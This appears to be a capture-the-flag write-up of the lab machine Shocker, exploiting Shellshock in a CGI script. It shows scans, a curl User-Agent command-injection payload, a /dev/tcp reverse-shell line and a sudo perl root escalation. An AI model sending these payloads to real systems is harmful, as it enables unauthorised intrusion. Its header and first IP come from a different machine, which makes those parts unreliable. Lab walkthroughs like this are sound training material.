![Netmon.PNG](/assets/Machines/Easy/Netmon/Netmon.png)


1. Send an ICMP echo request to machine's IP address.
```bash
┌──(root㉿est)-[/home/kali]
└─| ping -c 2 10.10.10.152
```


2. Scan open ports with **nmap**.
```bash
┌──(root㉿kali)-[/home/kali]
└─| nmap -p- --open -vv -sS --min-rate 5000 -Pn -n 10.10.10.152
```
**Output**
```bash
PORT     STATE SERVICE
80/tcp   open  http
2222/tcp open  EtherNetIP-1
```

3. Visit web page

![web.PNG](/assets/Machines/Easy/Shocker/web.PNG)

4. Use **wfuzz** to do dir busting
```bash
┌──(root㉿kali)-[/home/…/Desktop/Machines/Easy/Shocker]
└─| wfuzz -c -t 200 --hc=404 -w /usr/share/wordlists/dirbuster/directory-list-lowercase-2.3-medium.txt http://10.10.10.56/FUZZ/
```

**Output**
```bash
...
000000035:   403        11 L     32 W       294 Ch      "cgi-bin"
...
```

5. We dont have permission to listing **cgi-bin directory**. This directory have scripts **.sh** and **.pl**, do again dir busting but, in this case search files with previous extensions.
```bash
┌──(root㉿kali)-[/home/…/Desktop/Machines/Easy/Shocker]
└─| wfuzz -c -t 200 --hc=404 -w /usr/share/wordlists/dirbuster/directory-list-lowercase-2.3-medium.txt -z list,pl-sh-cgi http://10.10.10.56/cgi-bin/FUZZ.FUZ2
```

**Output**
```bash
...
000000374:   200        7 L      17 W       118 Ch      "user - sh"
...
```

6. If you visit previous file you download this, in this case we can try to know if web page is vulnerable to **shellshock**
```bash
┌──(root㉿kali)-[/home/…/Desktop/Machines/Easy/Shocker]
└─| nmap --script http-shellshock --script-args uri=/cgi-bin/user.sh -p80 10.10.10.56 
```

**Output**
```bash
PORT   STATE SERVICE
80/tcp open  http
| http-shellshock: 
|   VULNERABLE:
|   HTTP Shellshock vulnerability
|     State: VULNERABLE (Exploitable)
|     IDs:  CVE:CVE-2014-6271
|       This web application might be affected by the vulnerability known
|       as Shellshock. It seems the server is executing commands injected
|       via malicious HTTP headers.
|             
|     Disclosure date: 2014-09-24
|     References:
|       https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2014-7169
|       http://www.openwall.com/lists/oss-security/2014/09/24/10
|       https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2014-6271
|_      http://seclists.org/oss-sec/2014/q3/685
```

* Web page is vulnerable to **shellshock attack**

7. To know what field is vulnerable you can capture the petition of previous command and use tshark to watch more information

First, with tshark catch all information on **tun0 interface**
```bash
┌──(root㉿kali)-[/home/…/Desktop/Machines/Easy/Shocker]
└─| tshark -w Captura.pcap -i tun0
```

---

Then, execute previous nmap command to know if web is vulnerable to **shellshock attack**

---

Next, use **tshark** to filter more information 
```bash
┌──(root㉿kali)-[/home/…/Desktop/Machines/Easy/Shocker]
└─| tshark -r  Captura.pcap -Y 'http' -Tfields -e tcp.payload  2>/dev/null | xxd -ps -r; echo
```

**Output**
```bash
Referer: () { :;}; echo; echo -n luqatly; echo kajxoly
User-Agent: () { :;}; echo; echo -n luqatly; echo kajxoly
Host: 10.10.10.56
Connection: close
Cookie: () { :;}; echo; echo -n luqatly; echo kajxoly
```

* We look the fields, now we can try to execute `() { :;}echo; <command>` in any previous fields

8. The field vulnerable is **User-Agent**, use curl to try command execution
```bash
┌──(root㉿kali)-[/home/…/Desktop/Machines/Easy/Shocker]
└─| curl -s -X GET -H 'User-Agent: () { :;};echo; /usr/bin/whoami' http://10.10.10.56/cgi-bin/user.sh
shelly
```

* We can execute commands!


9. Do command to get a reverse shell
```bash
┌──(root㉿kali)-[/home/…/Desktop/Machines/Easy/Shocker]
└─| curl -s -X GET -H "User-Agent: () { :;};echo; /bin/bash -i >& /dev/tcp/<tun0 IP>/<Port> 0>&1" http://10.10.10.56/cgi-bin/user.sh
```

* Remember listen with **nc** in our machine
  
**Output**
```bash
┌──(root㉿kali)-[/home/…/Desktop/Machines/Easy/Shocker]
└─| nc -lvnp 443
listening on [any] 443 ...
connect to [10.10.14.32] from (UNKNOWN) [10.10.10.56] 45374
bash: no job control in this shell
shelly@Shocker:/usr/lib/cgi-bin$ whoami
whoami
shelly
```

10. Cat user flag
```bash
shelly@Shocker:/home/shelly$ cat user.txt 
fbbd65cc2beaedb01a87c2ef2f907b87
```

---
---
---

## **Privileges Escalation** 💀
1. Search ways to be root
```bash
shelly@Shocker:/home/shelly$ sudo -l
Matching Defaults entries for shelly on Shocker:
    env_reset, mail_badpass,
    secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin

User shelly may run the following commands on Shocker:
    (root) NOPASSWD: /usr/bin/perl
```

2. Visit https://gtfobins.github.io/ to get a way to be root with **perl**

![perl.PNG](/assets/Machines/Easy/Shocker/perl.PNG)

3. Execute commando to get a shell how root
```bash
shelly@Shocker:/home/shelly$ sudo perl -e 'exec "/bin/sh";'
# whoami
root
```

4. Cat **root flag**
```bash
# cat /root/root.txt
71f24c6fd59598c49e20706f3139104c
```